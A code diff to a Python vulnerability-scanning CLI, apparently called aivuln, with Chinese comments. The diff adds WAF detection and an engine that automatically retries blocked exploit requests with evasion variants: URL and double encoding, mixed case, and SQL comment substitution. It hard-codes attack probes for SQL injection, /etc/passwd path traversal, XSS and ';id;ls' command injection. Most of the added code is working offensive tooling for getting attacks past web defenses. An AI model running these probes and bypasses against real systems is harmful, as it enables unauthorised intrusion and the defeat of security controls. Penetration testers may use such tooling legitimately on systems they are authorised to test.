@@ -41,7 +41,13 @@ import yaml
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, quote, parse_qsl, urlencode
+
+# 集成 zh.py 工具集（网页探活/下载/域名匹配/漏洞URL匹配），复用其探活能力
+try:
+    import zh
+except ImportError:
+    zh = None
 
 # ─── 常量 ───────────────────────────────────────────────────
 POC_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "pocs")
@@ -439,9 +445,12 @@ def http_request(method: str, url: str, headers: dict, body: str, timeout: int, 
         return {"status_code": 0, "headers": {}, "body": "", "body_bytes": b"", "url": url, "error": str(e)}
 
 # ─── POC 执行引擎 ───────────────────────────────────────────
-def run_poc(target_url: str, poc: POC) -> list:
-    """对目标执行单个 POC，返回 Finding 列表"""
+def run_poc(target_url: str, poc: POC, bypass: bool = False) -> list:
+    """对目标执行单个 POC，返回 Finding 列表
+    :param bypass: 请求被WAF拦截时，自动尝试绕过变体（URL编码/双重编码/大小写/注释符）
+    """
     findings = []
+    bypass_hit = None  # 记录绕过成功的变形方式
 
     for req in poc.requests:
         # 处理 raw 格式
@@ -487,6 +496,24 @@ def run_poc(target_url: str, poc: POC) -> list:
                 all_ok = False
                 break
 
+            # WAF绕过: 请求被拦截时, 尝试变形后的变体
+            if bypass and is_waf_blocked(resp):
+                for variant in WAFBypass.variants_for_step(step):
+                    vresp = http_request(
+                        method=variant["method"],
+                        url=variant["path"],
+                        headers=variant["headers"],
+                        body=variant["body"],
+                        timeout=variant["timeout"],
+                        max_redirects=req.max_redirects,
+                    )
+                    if vresp["status_code"] == 0:
+                        continue
+                    if not is_waf_blocked(vresp):
+                        last_resp = vresp
+                        bypass_hit = variant.get("_waf_mode", "")
+                        break
+
         if not all_ok or last_resp is None:
             continue
 
@@ -514,6 +541,8 @@ def run_poc(target_url: str, poc: POC) -> list:
                 "status_code": last_resp["status_code"],
                 "timestamp": datetime.now().isoformat(),
             }
+            if bypass_hit:
+                finding["waf_bypass"] = bypass_hit  # 标记绕过方式
             findings.append(finding)
 
     return findings
@@ -530,7 +559,7 @@ def evaluate_matchers(req: POCRequest, resp: dict) -> bool:
         return all(m.match(resp["status_code"], resp["body"], resp["headers"]) for m in req.matchers)
 
 # ─── 扫描调度 ───────────────────────────────────────────────
-def scan(target_url: str, pocs: list, interval: float = 2.0, ai_analyze: bool = False, ai_payload: bool = False, ai_payload_interval: int = 10) -> list:
+def scan(target_url: str, pocs: list, interval: float = 2.0, ai_analyze: bool = False, ai_payload: bool = False, ai_payload_interval: int = 10, waf_detect: bool = False, bypass: bool = False) -> list:
     """批量扫描目标"""
     # 按危害级别排序
     pocs_sorted = sorted(pocs, key=lambda p: p.severity_rank())
@@ -541,9 +570,26 @@ def scan(target_url: str, pocs: list, interval: float = 2.0, ai_analyze: bool = 
     print(f"  间隔: {interval}s")
     print(f"  AI 分析: {'开启' if ai_analyze else '关闭'}")
     print(f"  AI Payload: {'开启' if ai_payload else '关闭'}")
+    print(f"  WAF 探测: {'开启' if waf_detect else '关闭'}")
+    print(f"  WAF 绕过: {'开启' if bypass else '关闭'}")
     if ai_payload:
         print(f"  AI Payload 间隔: 每 {ai_payload_interval} 个POC")
     print(f"{'='*60}\n")
+
+    # WAF 探测（扫描前）
+    waf_info = None
+    if waf_detect:
+        print(f"  [WAF探测] 正在检测目标防护...")
+        waf_info = detect_waf(target_url, verbose=True)
+        if waf_info["waf_detected"]:
+            print(f"  [!] 检测到WAF: {waf_info['waf_type']} (拦截状态码 {waf_info['block_status']})")
+            if bypass:
+                print(f"  [*] 已启用绕过模式，被拦截的请求将自动尝试变形重试")
+            else:
+                print(f"  [*] 提示: 加 --bypass 可启用WAF绕过重试，或 --waf-bypass 手动测试绕过")
+        else:
+            print(f"  [*] 未检测到明显WAF特征")
+        print()
 
     all_findings = []
     req_count = 0
@@ -553,7 +599,7 @@ def scan(target_url: str, pocs: list, interval: float = 2.0, ai_analyze: bool = 
     for i, poc in enumerate(pocs_sorted):
         print(f"[{i+1}/{len(pocs_sorted)}] {poc.name} [{poc.severity.upper()}]", end=" ")
 
-        findings = run_poc(target_url, poc)
+        findings = run_poc(target_url, poc, bypass=bypass)
         req_count += len(poc.requests)
 
         if findings:
@@ -561,6 +607,8 @@ def scan(target_url: str, pocs: list, interval: float = 2.0, ai_analyze: bool = 
             for f in findings:
                 print(f"    → {f['url']} (HTTP {f['status_code']})")
                 print(f"    证据: {f['evidence'][:100]}")
+                if f.get("waf_bypass"):
+                    print(f"    [绕过] 通过 [{f['waf_bypass']}] 变形绕过WAF命中!")
             all_findings.extend(findings)
         else:
             print("✗ 未命中")
@@ -836,6 +884,200 @@ GET|/download?file=../../../../etc/passwd||status_code==200 && body contains "ro
         print(f"[!] AI生成payload失败: {e}")
         return []
 
+# ─── WAF 探测与绕过引擎 ─────────────────────────────────────
+
+# WAF拦截常见状态码
+WAF_BLOCK_STATUS = {403, 406, 418, 423, 429, 503, 509}
+# 拦截页特征关键词（小写匹配）
+WAF_BLOCK_KEYWORDS = [
+    "waf", "blocked", "blocking", "access denied", "forbidden",
+    "拦截", "安全防护", "防护拦截", "禁止访问", "触发安全",
+    "safedog", "d盾", "护卫神", "玄武盾", "加速乐", "创宇盾",
+    "incapsula", "cloudflare", "please wait", "captcha", "verify your",
+]
+# 内容过滤型WAF常见异常状态码
+WAF_SUSPECT_STATUS = {400, 405, 412, 444}
+
+def is_waf_blocked(resp: dict) -> bool:
+    """判断响应是否为WAF拦截页（状态码/特征词）"""
+    if not resp:
+        return False
+    sc = resp.get("status_code", 0)
+    if sc in WAF_BLOCK_STATUS:
+        return True
+    body = (resp.get("body") or "").lower()
+    for kw in WAF_BLOCK_KEYWORDS:
+        if kw in body:
+            return True
+    return False
+
+def detect_waf(target_url: str, timeout: int = 10, verbose: bool = True) -> dict:
+    """
+    探测目标是否部署WAF。
+    方法: 对比"基线请求"(无害)与"攻击特征请求"(时间延迟等无害特征)的响应差异。
+    返回: {"waf_detected", "waf_type", "block_status", "evidence"}
+    """
+    result = {
+        "waf_detected": False,
+        "waf_type": "未识别到WAF",
+        "block_status": None,
+        "evidence": [],
+    }
+    base_url = target_url.rstrip("/")
+
+    # 基线请求（无害，用于判断目标可达性和正常响应特征）
+    base = http_request("GET", base_url + "/?k=1", {}, "", timeout, 3)
+    if base["status_code"] == 0:
+        if verbose:
+            print(f"    │ ✗ 目标不可达: {base.get('error')}")
+        return result
+    base_len = len(base.get("body") or "")
+
+    # 攻击特征探针（使用无害时间延迟等，不实际利用）
+    probes = [
+        ("SQL注入(SLEEP)", "/?id=1' AND SLEEP(5)--"),
+        ("SQL注入(UNION)", "/?id=1 UNION SELECT 1,2,3"),
+        ("路径穿越", "/portal/../../../../etc/passwd"),
+        ("XSS特征", "/?q=<script>alert(1)</script>"),
+        ("命令注入", "/?cmd=;id;ls"),
+    ]
+
+    if verbose:
+        print(f"    │ [WAF探测] 基线: HTTP {base['status_code']}, {base_len}B")
+    for name, suffix in probes:
+        resp = http_request("GET", base_url + suffix, {}, "", timeout, 3)
+        if resp["status_code"] == 0:
+            continue
+        sc = resp["status_code"]
+        rlen = len(resp.get("body") or "")
+        blocked = False
+        if is_waf_blocked(resp):
+            blocked = True
+        elif sc != base["status_code"] and sc in WAF_SUSPECT_STATUS:
+            blocked = True
+        # 同状态码但长度骤变(<基线30%) 且状态码200：疑似拦截页
+        elif sc == base["status_code"] and base_len > 0 and rlen < base_len * 0.3:
+            blocked = True
+        mark = "拦截!" if blocked else "放行"
+        if verbose:
+            print(f"    │ [WAF探测] {name}: HTTP {sc}, {rlen}B -> {mark}")
+        if blocked:
+            result["evidence"].append((name, sc, suffix))
+
+    if result["evidence"]:
+        result["waf_detected"] = True
+        result["block_status"] = max(c for _, c, _ in result["evidence"])
+        codes = {c for _, c, _ in result["evidence"]}
+        if 423 in codes:
+            result["waf_type"] = "自定义WAF(423封锁)"
+        elif 403 in codes:
+            result["waf_type"] = "403封锁型WAF"
+        elif 406 in codes:
+            result["waf_type"] = "内容过滤型WAF(ModSecurity类)"
+        elif 429 in codes:
+            result["waf_type"] = "请求限速型WAF"
+        else:
+            result["waf_type"] = "内容过滤型WAF"
+    return result
+
+class WAFBypass:
+    """WAF绕过变形引擎 - 确定性变形规则，供扫描中自动重试使用"""
+
+    MODES = ("urlencode", "double", "mixedcase", "sqlcomment")
+
+    @staticmethod
+    def transform_query(url: str, mode: str) -> str:
+        """对URL query参数值做变形，返回新URL"""
+        parsed = urlparse(url)
+        if not parsed.query:
+            return url
+        try:
+            params = [(k, WAFBypass._transform_value(v, mode))
+                      for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
+            new_q = urlencode(params)
+        except Exception:
+            return url
+        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_q}"
+
+    @staticmethod
+    def transform_body(body: str, mode: str) -> str:
+        """对POST body参数值做变形"""
+        if not body or "=" not in body:
+            return body
+        parts = []
+        for seg in body.split("&"):
+            if "=" in seg:
+                k, v = seg.split("=", 1)
+                parts.append(f"{k}={WAFBypass._transform_value(v, mode)}")
+            else:
+                parts.append(seg)
+        return "&".join(parts)
+
+    @staticmethod
+    def _transform_value(v: str, mode: str) -> str:
+        if mode == "urlencode":
+            # 单次URL编码（WAF解码一次后应用层收到的仍是攻击载荷）
+            return quote(v, safe="")
+        if mode == "double":
+            # 双重URL编码（利用WAF只解码一次的缺陷）
+            return quote(quote(v, safe=""), safe="")
+        if mode == "mixedcase":
+            # 大小写混淆（绕过大小写敏感的规则）
+            out = []
+            for i, ch in enumerate(v):
+                if ch.isalpha():
+                    out.append(ch.upper() if i % 2 == 0 else ch.lower())
+                else:
+                    out.append(ch)
+            return "".join(out)
+        if mode == "sqlcomment":
+            # SQL注释/空白符替换（绕过基于空格的规则）
+            return v.replace("--", "/*").replace(" ", "/**/").replace("%20", "/**/")
+        return v
+
+    @staticmethod
+    def _bypass_path(url: str, mode: str) -> str:
+        """对URL路径中的路径穿越特征做变形（query为空时使用）"""
+        parsed = urlparse(url)
+        path = parsed.path
+        if mode == "urlencode":
+            # 仅编码路径穿越中的点号，保留斜杠结构
+            new_path = path.replace("..", "%2e%2e")
+        elif mode == "double":
+            new_path = path.replace("..", "%252e%252e")
+        elif mode == "mixedcase":
+            new_path = path  # 路径大小写对绕过意义不大
+        elif mode == "sqlcomment":
+            new_path = path.replace("/../", "/%2e%2e/")
+        else:
+            new_path = path
+        q = f"?{parsed.query}" if parsed.query else ""
+        return f"{parsed.scheme}://{parsed.netloc}{new_path}{q}"
+
+    @staticmethod
+    def variants_for_step(step: dict) -> list:
+        """对POC的一个step请求生成绕过变体列表（不含原始请求）
+        有query参数时对参数值变形；无query时对路径穿越特征变形
+        """
+        variants = []
+        url = step.get("path") or step.get("url") or ""
+        body = step.get("body") or ""
+        has_query = bool(urlparse(url).query)
+        for mode in WAFBypass.MODES:
+            if has_query:
+                new_url = WAFBypass.transform_query(url, mode)
+                new_body = WAFBypass.transform_body(body, mode)
+            else:
+                new_url = WAFBypass._bypass_path(url, mode)
+                new_body = WAFBypass.transform_body(body, mode)
+            if (new_url, new_body) != (url, body):
+                v = dict(step)
+                v["path"] = new_url
+                v["body"] = new_body
+                v["_waf_mode"] = mode
+                variants.append(v)
+        return variants
+
 def save_temp_payload(payloads: list, target: str) -> str:
     """保存payload到临时文件"""
     import tempfile
@@ -1093,6 +1335,8 @@ def cmd_scan(args):
     ai_analyze = args.ai
     ai_payload = args.ai_payload
     ai_payload_interval = args.ai_payload_interval
+    waf_detect = args.waf_detect
+    bypass = args.bypass
 
     print(f"[*] 加载 POC 库: {poc_dir}")
     pocs = load_pocs(poc_dir)
@@ -1100,7 +1344,62 @@ def cmd_scan(args):
         print("[!] 未找到 POC，退出")
         return
 
-    scan(target, pocs, interval, ai_analyze, ai_payload, ai_payload_interval)
+    scan(target, pocs, interval, ai_analyze, ai_payload, ai_payload_interval, waf_detect, bypass)
+
+def cmd_waf(args):
+    """waf 命令: 探测目标WAF + 测试绕过"""
+    target = args.target
+
+    print(f"\n{'='*60}")
+    print(f"  WAF 探测: {target}")
+    print(f"{'='*60}\n")
+
+    result = detect_waf(target, verbose=True)
+
+    print(f"\n{'='*60}")
+    if result["waf_detected"]:
+        print(f"  [!] 检测到 WAF!")
+        print(f"      类型: {result['waf_type']}")
+        print(f"      拦截状态码: {result['block_status']}")
+        print(f"      拦截特征: {len(result['evidence'])} 类攻击请求被拦")
+    else:
+        print(f"  [*] 未检测到明显 WAF 特征")
+    print(f"{'='*60}\n")
+
+    if not result["waf_detected"]:
+        return
+
+    # 测试各绕过变体是否有效
+    print(f"  [*] 测试 WAF 绕过变体...\n")
+    bypass_result = test_waf_bypass(target)
+    print(f"\n  [*] 绕过测试完成: {bypass_result['success']}/{bypass_result['total']} 个变体有效")
+    for mode, ok in bypass_result["details"].items():
+        status = "✓ 绕过成功" if ok else "✗ 仍被拦截"
+        print(f"    {mode:<12} {status}")
+
+def test_waf_bypass(target_url: str, timeout: int = 10) -> dict:
+    """对攻击特征请求测试各绕过变体，判断哪些变体能绕过WAF"""
+    probes = [
+        ("/portal/../../../../etc/passwd", "GET", "", "路径穿越"),
+    ]
+    result = {"success": 0, "total": 0, "details": {}}
+    base = target_url.rstrip("/")
+
+    # 用路径穿越作为基准攻击特征（无害，仅探测是否拦截）
+    probe_url = base + probes[0][0]
+    for mode in WAFBypass.MODES:
+        test_url = WAFBypass.transform_query(probe_url, mode)
+        if test_url == probe_url:
+            # query空则改用path变形
+            test_url = WAFBypass._bypass_path(probe_url, mode)
+        resp = http_request("GET", test_url, {}, "", timeout, 3)
+        result["total"] += 1
+        if resp["status_code"] != 0 and not is_waf_blocked(resp):
+            result["success"] += 1
+            result["details"][mode] = True
+        else:
+            result["details"][mode] = False
+    return result
 
 def cmd_payload(args):
     """payload 命令"""
@@ -1146,6 +1445,7 @@ aivuln CLI — Python 版漏洞扫描工具
 用法:
   python vuln_cli.py scan <target> [选项]       扫描目标（POC 模式）
   python vuln_cli.py payload <target> [选项]    Payload 挖掘模式
+  python vuln_cli.py waf <target>               WAF 探测与绕过测试
   python vuln_cli.py list [选项]                列出 POC
   python vuln_cli.py /ai                        配置 AI
   python vuln_cli.py /AI配置                    配置 AI（中文）
@@ -1157,6 +1457,8 @@ scan 选项:
   --ai                      启用 AI 分析
   --ai-payload              启用 AI 动态生成 Payload
   --ai-payload-interval <n> 每隔 n 个 POC 生成一次 AI Payload (默认: 10)
+  --waf-detect              扫描前自动探测目标 WAF
+  --bypass                  请求被 WAF 拦截时自动尝试变形绕过重试
 
 payload 选项:
   --type <type>     Payload 类型: sqli/xss/lfi/cmdi (必填)
@@ -1168,6 +1470,9 @@ payload 选项:
   python vuln_cli.py scan http://target.com --pocs ./my_pocs --interval 1
   python vuln_cli.py scan http://target.com --ai --ai-payload
   python vuln_cli.py scan http://target.com --ai-payload --ai-payload-interval 5
+  python vuln_cli.py scan http://target.com --waf-detect
+  python vuln_cli.py scan http://target.com --waf-detect --bypass
+  python vuln_cli.py waf http://target.com
   python vuln_cli.py payload "http://target.com/page?id=1" --type sqli
   python vuln_cli.py payload "http://target.com/search?q=test" --type xss --interval 1
   python vuln_cli.py /ai
@@ -1190,6 +1495,12 @@ def main():
     p_scan.add_argument("--ai", action="store_true", help="启用 AI 分析")
     p_scan.add_argument("--ai-payload", action="store_true", help="启用 AI 动态生成 Payload")
     p_scan.add_argument("--ai-payload-interval", type=int, default=10, help="每隔多少个 POC 生成一次 AI Payload（默认: 10）")
+    p_scan.add_argument("--waf-detect", action="store_true", help="扫描前自动探测目标 WAF")
+    p_scan.add_argument("--bypass", action="store_true", help="请求被 WAF 拦截时自动尝试变形绕过重试")
+
+    # waf
+    p_waf = subparsers.add_parser("waf", help="WAF 探测与绕过测试")
+    p_waf.add_argument("target", help="目标 URL")
 
     # payload
     p_payload = subparsers.add_parser("payload", help="Payload 挖掘模式")
@@ -1209,6 +1520,8 @@ def main():
 
     if args.command == "scan":
         cmd_scan(args)
+    elif args.command == "waf":
+        cmd_waf(args)
     elif args.command == "payload":
         cmd_payload(args)
     elif args.command == "list":
